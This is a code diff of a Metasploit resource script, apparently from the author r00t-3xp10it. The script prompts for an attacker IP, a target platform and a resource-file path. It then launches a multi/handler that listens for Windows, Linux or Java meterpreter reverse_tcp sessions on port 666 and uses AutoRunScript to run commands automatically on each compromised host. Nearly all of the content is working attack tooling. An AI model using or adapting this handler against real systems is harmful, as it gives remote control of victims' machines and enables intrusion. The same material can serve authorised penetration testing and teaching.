@@ -3,25 +3,43 @@
 
     Description:
       Resource File to get the LHOST variable from
-      user input and start one msf multi/handler.
+      user input and start one msf multi/handler with
+      AutoRunScript option pointing to our resource file.
 
     Author:
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
 
    |
    print_line(help)
-   Rex::sleep(2.0)
-   print "Input LHOST:"
+   Rex::sleep(1.0)
+   print "Input LHOST: "
 
       ## 'gets' is used to get the LHOST variable from user input, but appends on it the
       # trailing new line character i.e.'\n' in the end of the string. 'chomp' is the method
       # to remove the trailing new line character i.e. '\n' from the end of the string.
-      addr = gets.chomp
+      get_addr = gets.chomp
+      print "Input platform to exploit (Windows|Linux): "
+      get_os = gets.chomp
+      print "Input resouce file absoluct path: "
+      get_path = gets.chomp
+
+
+      # sellect session platform (payload)
+      if (get_os =~ /Windows/i)  
+         payload = "windows/meterpreter/reverse_tcp"
+      elsif (get_os =~ /Linux/i)
+         payload = "linux/x86/meterpreter/reverse_tcp"
+      else
+         payload = "java/meterpreter/reverse_tcp"
+      end
+
 
       run_single("use exploit/multi/handler")
-      run_single("set PAYLOAD windows/meterpreter/reverse_https")
+      ## set AutoRunScript option to run our resource file
+      run_single("set AutoRunScript multi_console_command -r #{get_path}")
+      run_single("set PAYLOAD #{payload}")
       run_single("set ExitOnSession false")
-      run_single("set LHOST #{addr}")
+      run_single("set LHOST #{get_addr}")
       run_single("set LPORT 666")
    run_single("exploit")
    run_single("back")
